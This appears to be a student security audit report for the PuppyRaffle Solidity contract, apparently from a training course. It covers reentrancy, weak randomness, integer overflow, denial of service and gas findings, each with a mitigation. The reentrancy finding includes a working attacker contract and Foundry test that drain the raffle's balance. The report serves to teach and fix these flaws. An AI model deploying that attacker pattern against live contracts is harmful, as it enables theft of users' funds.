# High 

### [H-1] Reentrancy attack in `PuppyRaffle::refund` allows entrants to drain contract for raffle balance 

**Description** The `PuppyRaffle::refund` function does not follow CEI (Checks, Effects, Interactions) and as a result enables participants to drain the contract balance 

In the `PuppyRaffle::refund` we first make an external call to the `msg.sender` address and only after making that external call do we update the `PuppyRaffle::players` array.

```javascript

function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

        payable(msg.sender).sendValue(entranceFee);
        
@>        players[playerIndex] = address(0);
@>        emit RaffleRefunded(playerAddress);
    }
```

A player who has entered the raffle could have a fallback/receive function that calls the `PuppyRaffle::refund` again and claim another refund they could continue the cycle till the contract balance is drained.

**Impact** All fees paid by raffle entrants could be stole by the malicious player 

**Proof of Concept**
1. User enters the raffle
2. Attacker set up a contract with a `fallback` function that calls `PuppyRaffle::refund`
3. Attacker enters the raffle 
4. Attacker calls `PuppyRaffle::refund`from their attack contract, draining the contract balance of the `PuppyRaffle`

**Proof of Code**
<details> <summary>Code</summary>

Place the following into `PuppyRaffleTest.t.sol`

```javascript 

 function test_reentrancyRefund() public {

        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
        address attackUser  = makeAddr("attackUser");
        vm.deal(attackUser, 1 ether);


        uint256 startingAttackBalance = address(attackerContract).balance;
        uint256 startingPuppyBalance = address(puppyRaffle).balance; 

        vm.prank(attackUser);
        attackerContract.attack{value: entranceFee}();

        console.log("starting attack contract balance", startingAttackBalance);
        console.log("starting puppy contract balance", startingPuppyBalance);

        console.log("ending attack contract balance", address(attackerContract).balance);
        console.log("ending puppy contract balance", address(puppyRaffle).balance);


    }


```
And this contract as well 

```javascript 

contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle; 
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyRaffle){
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() public payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    function _stealMoney() internal {
        if(address(puppyRaffle).balance >= entranceFee){
            puppyRaffle.refund(attackerIndex);
        }
    }

    fallback() external payable {
       _stealMoney();
    }

    receive() external payable {
       _stealMoney();
    }
}

```

</details>

**Recomended Mitigation** 

To prevent this, we should have the `PuppyRaffle::refund` function update the `players` array first before making the external call. Additionally we should move the event emission up as well

```diff

function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

+       players[playerIndex] = address(0);
+       emit RaffleRefunded(playerAddress);

        payable(msg.sender).sendValue(entranceFee);
        
-        players[playerIndex] = address(0);
-        emit RaffleRefunded(playerAddress);
    }

```


### [H-2] Weak randomness in `PuppyRaffle::selectWinner` allows users to influence or predict the winner and predict the winning puppy

**Description:** Hashing `msg.sender`, `block.timestamp`, and `block.difficulty` together creates a predictable and deterministic number. A predictable number is not a good random number malicious users could manipulate and predict the numbers and pick a winner by themselves.

*Notes* = this mean users can frontrun this function and call refund if they see that they are not the winner 

**Impact:** Any user can influence the winner of the raffle, winning the raffle and selecting the  `rarest` puppy. Making the entire raffle worthless if it becomes a gas war as to who wins the raffle and get the rarest puppy.

**Proof Of Concept:**
1. Validators could know the `block.timestamp` and `block.difficulty` and use that to predict when/how to participate. See the [solidity blog on prevrandao](https://soliditydeveloper.com/prevrandao). `block.difficulty` was recently replaced with block.prevrandao
2. User can mine/manipulate the `msg.sender` value to result in the address being used to generate the winner 
3. Users can revert their `selectWinner` transaction if they dont like the winner or resulting puppy.


**Recommended Mitigation:** Consider using a cryptographically provable random number generator such as chainlink VRF. 


### [H-3] Integer overflow of `PuppyRaffle::totalFees` loses fee 

**Description** In solidity versions prior to `0.8.0` integers were subject to integers overflows.

```javascript

uint64 myVar = type(uint64).max
//18446744073709551615
myVar = myVar + 1

```

**Impact** In `PuppyRaffle::selectWinner` , `totalFees` are accumulated for the fee address to collect later in `withdrawFees`. However if the total fees variables overflows the fee address may not collect the correct amount of fees leaving fees stuck permanently in the contract

**Proof of Concept** 
1. We concluded a raffle of 4 players
2. We then have 89 players enter a new raffle, and conclude the raffle 
3. `totalFees` will be 

```javascript 
totalFees = totalFees + uint64(fee);
// substituted
totalFees = 800000000000000000 + 17800000000000000000;
// due to overflow, the following is now the case
totalFees = 153255926290448384;

```

4. You will not be able to withdraw due to this line in `PuppyRafle::withdrawFees`

```javascript 
        require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");

```

Although you could use `selfdestruct` to forcefully send eth to this contract to match the balance so as for you to withdraw but this is not the intended design of the protocol . At some point there would be too much balance in the contract that the above require would be imposible to hit.

<details><dummary>Code</summary>

```javascript 

function testTotalFeesOverflow() public playersEntered {
        // We finish a raffle of 4 to collect some fees
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        puppyRaffle.selectWinner();
        uint256 startingTotalFees = puppyRaffle.totalFees();
        // startingTotalFees = 800000000000000000

        // We then have 89 players enter a new raffle
        uint256 playersNum = 89;
        address[] memory players = new address[](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            players[i] = address(i);
        }
        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
        // We end the raffle
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        // And here is where the issue occurs
        // We will now have fewer fees even though we just finished a second raffle
        puppyRaffle.selectWinner();

        uint256 endingTotalFees = puppyRaffle.totalFees();
        console.log("ending total fees", endingTotalFees);
        assert(endingTotalFees < startingTotalFees);

        // We are also unable to withdraw any fees because of the require check
        vm.prank(puppyRaffle.feeAddress());
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }

```

**Recommended Mitigations** There are few mitigations

1. Use a new version of solidity and also use `uint256` instead of using `uint64` for `PuppyRaffle::totalFees`

2. You could also use the `SafeMath` Math library of OpenZeppelin for version `0.7.6` solidity. However you can still run into troubles using the uint64 if too many fees are collected 

3. Remove the balance check from `PuppyRaffle::withdrawFee`

```diff 

-  require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");

```
There are more attack vectors with that final require, but we recommend removing it regardless. 

</details>

# Medium

## 
### [M-1] Looping through players array to check for duplicates in `PuppyRaffle::enterRaffle` is a potential DoS vector, incrementing gas costs for future entrants

**Description:** The `PuppyRaffle::enterRaffle` function loops through the `players` array to check for duplicates. However, the longer the `PuppyRaffle:players` array is, the more checks a new player will have to make. This means that the gas costs for players who enter right when the raffle starts will be dramatically lower than those who enter later. Every additional address in the `players` array, is an additional check the loop will have to make. 

**Note to students: This next line would likely be it's own finding itself. However, we haven't taught you about MEV yet, so we are going to ignore it.**
Additionally, this increased gas cost creates front-running opportunities where malicious users can front-run another raffle entrant's transaction, increasing its costs, so their enter transaction fails. 

**Impact:** The impact is two-fold.

1. The gas costs for raffle entrants will greatly increase as more players enter the raffle.
2. Front-running opportunities are created for malicious users to increase the gas costs of other users, so their transaction fails.

**Proof of Concept:** 

If we have 2 sets of 100 players enter, the gas costs will be as such:
- 1st 100 players: 6252039
- 2nd 100 players: 18067741

This is more than 3x as expensive for the second set of 100 players! 

This is due to the for loop in the `PuppyRaffle::enterRaffle` function. 

```javascript
        // Check for duplicates
@>      for (uint256 i = 0; i < players.length - 1; i++) {
            for (uint256 j = i + 1; j < players.length; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }
```

<details>
<summary>Proof Of Code</summary>
Place the following test into `PuppyRaffleTest.t.sol`.

```javascript
function testReadDuplicateGasCosts() public {
        vm.txGasPrice(1);

        // We will enter 5 players into the raffle
        uint256 playersNum = 100;
        address[] memory players = new address[](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            players[i] = address(i);
        }
        // And see how much gas it cost to enter
        uint256 gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
        uint256 gasEnd = gasleft();
        uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;
        console.log("Gas cost of the 1st 100 players:", gasUsedFirst);

        // We will enter 5 more players into the raffle
        for (uint256 i = 0; i < playersNum; i++) {
            players[i] = address(i + playersNum);
        }
        // And see how much more expensive it is
        gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
        gasEnd = gasleft();
        uint256 gasUsedSecond = (gasStart - gasEnd) * tx.gasprice;
        console.log("Gas cost of the 2nd 100 players:", gasUsedSecond);

        assert(gasUsedFirst < gasUsedSecond);
        // Logs:
        //     Gas cost of the 1st 100 players: 6252039
        //     Gas cost of the 2nd 100 players: 18067741
}
```
</details>

**Recommended Mitigation:** There are a few recommended mitigations.

1. Consider allowing duplicates. Users can make new wallet addresses anyways, so a duplicate check doesn't prevent the same person from entering multiple times, only the same wallet address.
2. Consider using a mapping to check duplicates. This would allow you to check for duplicates in constant time, rather than linear time. You could have each raffle have a `uint256` id, and the mapping would be a player address mapped to the raffle Id. 

```diff
+    mapping(address => uint256) public addressToRaffleId;
+    uint256 public raffleId = 0;
    .
    .
    .
    function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        for (uint256 i = 0; i < newPlayers.length; i++) {
            players.push(newPlayers[i]);
+            addressToRaffleId[newPlayers[i]] = raffleId;            
        }

-        // Check for duplicates
+       // Check for duplicates only from the new players
+       for (uint256 i = 0; i < newPlayers.length; i++) {
+          require(addressToRaffleId[newPlayers[i]] != raffleId, "PuppyRaffle: Duplicate player");
+       }    
-        for (uint256 i = 0; i < players.length; i++) {
-            for (uint256 j = i + 1; j < players.length; j++) {
-                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-            }
-        }
        emit RaffleEnter(newPlayers);
    }
.
.
.
    function selectWinner() external {
+       raffleId = raffleId + 1;
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
```

Alternatively, you could use [OpenZeppelin's `EnumerableSet` library](https://docs.openzeppelin.com/contracts/4.x/api/utils#EnumerableSet).

### [M-2] Balance check on `PuppyRaffle::withdrawFees` enables griefers to selfdestruct a contract to send ETH to the raffle, blocking withdrawals

**Description:** The `PuppyRaffle::withdrawFees` function checks the `totalFees` equals the ETH balance of the contract (`address(this).balance`). Since this contract doesn't have a `payable` fallback or `receive` function, you'd think this wouldn't be possible, but a user could `selfdesctruct` a contract with ETH in it and force funds to the `PuppyRaffle` contract, breaking this check. 

```javascript
    function withdrawFees() external {
@>      require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
        uint256 feesToWithdraw = totalFees;
        totalFees = 0;
        (bool success,) = feeAddress.call{value: feesToWithdraw}("");
        require(success, "PuppyRaffle: Failed to withdraw fees");
    }
```

**Impact:** This would prevent the `feeAddress` from withdrawing fees. A malicious user could see a `withdrawFee` transaction in the mempool, front-run it, and block the withdrawal by sending fees. 

**Proof of Concept:**

1. `PuppyRaffle` has 800 wei in it's balance, and 800 totalFees.
2. Malicious user sends 1 wei via a `selfdestruct`
3. `feeAddress` is no longer able to withdraw funds

**Recommended Mitigation:** Remove the balance check on the `PuppyRaffle::withdrawFees` function. 

```diff
    function withdrawFees() external {
-       require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
        uint256 feesToWithdraw = totalFees;
        totalFees = 0;
        (bool success,) = feeAddress.call{value: feesToWithdraw}("");
        require(success, "PuppyRaffle: Failed to withdraw fees");
    }
```

### [M-3] Unsafe cast of `PuppyRaffle::fee` loses fees

**Description:** In `PuppyRaffle::selectWinner` their is a type cast of a `uint256` to a `uint64`. This is an unsafe cast, and if the `uint256` is larger than `type(uint64).max`, the value will be truncated. 

```javascript
    function selectWinner() external {
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(players.length > 0, "PuppyRaffle: No players in raffle");

        uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
        address winner = players[winnerIndex];
        uint256 fee = totalFees / 10;
        uint256 winnings = address(this).balance - fee;
@>      totalFees = totalFees + uint64(fee);
        players = new address[](0);
        emit RaffleWinner(winner, winnings);
    }
```

The max value of a `uint64` is `18446744073709551615`. In terms of ETH, this is only ~`18` ETH. Meaning, if more than 18ETH of fees are collected, the `fee` casting will truncate the value. 

**Impact:** This means the `feeAddress` will not collect the correct amount of fees, leaving fees permanently stuck in the contract.

**Proof of Concept:** 

1. A raffle proceeds with a little more than 18 ETH worth of fees collected
2. The line that casts the `fee` as a `uint64` hits
3. `totalFees` is incorrectly updated with a lower amount

You can replicate this in foundry's chisel by running the following:

```javascript
uint256 max = type(uint64).max
uint256 fee = max + 1
uint64(fee)
// prints 0
```

**Recommended Mitigation:** Set `PuppyRaffle::totalFees` to a `uint256` instead of a `uint64`, and remove the casting. Their is a comment which says:

```javascript
// We do some storage packing to save gas
```
But the potential gas saved isn't worth it if we have to recast and this bug exists. 

```diff
-   uint64 public totalFees = 0;
+   uint256 public totalFees = 0;
.
.
.
    function selectWinner() external {
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
        uint256 winnerIndex =
            uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
        address winner = players[winnerIndex];
        uint256 totalAmountCollected = players.length * entranceFee;
        uint256 prizePool = (totalAmountCollected * 80) / 100;
        uint256 fee = (totalAmountCollected * 20) / 100;
-       totalFees = totalFees + uint64(fee);
+       totalFees = totalFees + fee;
```

### [M-4] Smart Contract wallet raffle winners without a `receive` or a `fallback` will block the start of a new contest

**Description:** The `PuppyRaffle::selectWinner` function is responsible for resetting the lottery. However, if the winner is a smart contract wallet that rejects payment, the lottery would not be able to restart. 

Non-smart contract wallet users could reenter, but it might cost them a lot of gas due to the duplicate check.

**Impact:** The `PuppyRaffle::selectWinner` function could revert many times, and make it very difficult to reset the lottery, preventing a new one from starting. 

Also, true winners would not be able to get paid out, and someone else would win their money!

**Proof of Concept:** 
1. 10 smart contract wallets enter the lottery without a fallback or receive function.
2. The lottery ends
3. The `selectWinner` function wouldn't work, even though the lottery is over!

**Recommended Mitigation:** There are a few options to mitigate this issue.

1. Do not allow smart contract wallet entrants (not recommended)
2. Create a mapping of addresses -> payout so winners can pull their funds out themselves, putting the owness on the winner to claim their prize. (Recommended)


# Lows

## [L-1] `PuppyRaffle::getActibePlayerIndex` for non-existing players and player at 0 causing a player at index 0 to incorrectly think they have not entered the raffle 

**Description** If a player is at index 0 in the `PuppyRaffle::players` this will return 0, it will also return 0 if a player is not in the array 

```javascript 
    function getActivePlayerIndex(address player) external view returns (uint256) {
        for (uint256 i = 0; i < players.length; i++) {
            if (players[i] == player) {
                return i;
            }
        }
        //@audit if a player is at index 0 this will return 0 making the player think they are not active 
        return 0;
    }
```

**Impact** A player at index 0 might think they have not entered the raffle and might try to re enter the raffle again wasting gas 

**Proof of Concept** 
1. Player enter the raffle, they are the first entrant 
2. `PuppyRaffle::getActibePlayerIndex` returns 0 
3. Player thinks they have not entered the raffle due to the function documentation 

**Recommended Mitigation** The easiest recommmendation would be to revert if the player is not in the array instead of returning 0 

You could also reserve the 0th position for any competition, but a better solution might be to return `int256` where the function returns -1 if the player is not active 


# Gas

### [G-1] Unchanged state variables should be declared as immutable or constant

Reading from a storage variable is more expensive than reading from a constant  or immutable variables  

Instances
- `PuppyRaffle::raffleDuration` should be `immutable`
- `PuppyRaffle::commonImageUri` should be `constant`
- `PuppyRaffle::rareImageUri` should be `constant`
- `PuppyRaffle::legendaryImageUri` should be `constant`

### [G-2] Storage variable in a loop should be cached 

Everytime you call `players.lenght` you read from storage as opposed to memory which is more gas efficient 

``` diff
+    uint256 playersLength = players.length 
-    for (uint256 i = 0; i < players.length - 1; i++) {
+    for (uint256 i = 0; i < playersLength - 1; i++) {
-               for (uint256 j = i + 1; j < players.length; j++) {
+               for (uint256 j = i + 1; j < playersLength; j++) {
                    require(players[i] != players[j], "PuppyRaffle: Duplicate player");
                }
            }


```


# Informational

### [I-1] Solidity pragma should be specific, not wide

Consider using a specific version of Solidity in your contracts instead of a wide version. For example, instead of `pragma solidity ^0.8.0;`, use `pragma solidity 0.8.0;`

<details><summary>1 Found Instances</summary>


- Found in src/PuppyRaffle.sol [Line: 2](src/PuppyRaffle.sol#L2)

	```solidity
	pragma solidity ^0.7.6;
	```

</details>

### [I-2] Using an outdated version of solidity is not recommended

solc frequently releases new compiler versions. Using an old version prevents access to new Solidity security checks. We also recommend avoiding complex pragma statement.

**Recommendation**
Deploy with a recent version of Solidity (at least `0.8.0`) with no known severe issues.

Use a simple pragma version that allows any of these versions. Consider using the latest version of Solidity for testing.

Please see [slither](https://github.com/crytic/slither/wiki/Detector-Documentation#incorrect-versions-of-solidity) documentation for more information 

### [I-3] Missing checks for `address(0)` when assigning values to address state variables

Check for `address(0)` when assigning values to address state variables.

<details><summary>2 Found Instances</summary>


- Found in src/PuppyRaffle.sol [Line: 70](src/PuppyRaffle.sol#L70)

	```solidity
	        feeAddress = _feeAddress;
	```

- Found in src/PuppyRaffle.sol [Line: 227](src/PuppyRaffle.sol#L227)

	```solidity
	        feeAddress = newFeeAddress;
	```

### [I-4] `PupppyRaffle::selectWinner` does not follow CEI (Checks, Effects, Interacts) which is not best practice 

its best to keep code clean and follow CEI 

```diff

-    (bool success,) = winner.call{value: prizePool}("");
-    require(success, "PuppyRaffle: Failed to send prize pool to winner");
     _safeMint(winner, tokenId);
+     (bool success,) = winner.call{value: prizePool}("");
+     require(success, "PuppyRaffle: Failed to send prize pool to winner");

```


### [I-5] Using of "magic" numbers is discouraged

It can be confusing to see numbers literals in the code base its easier to read if the numbers are named 

```javascript

        uint256 prizePool = (totalAmountCollected * 80) / 100;
        uint256 fee = (totalAmountCollected * 20) / 100;

```

instead you could use 

```javascript 
        uint256 public constant PRICE_POOL_PERCENTAGE = 80; 
        uint256 public constant FEE_PERCENTAGE = 20;
        uint256 public constant  POOL_PRECISION = 100;

```

### [I-5] _isActivePlayer is never used and should be removed

**Description:** The function `PuppyRaffle::_isActivePlayer` is never used and should be removed. 

```diff
-    function _isActivePlayer() internal view returns (bool) {
-        for (uint256 i = 0; i < players.length; i++) {
-            if (players[i] == msg.sender) {
-                return true;
-            }
-        }
-        return false;
-    }
```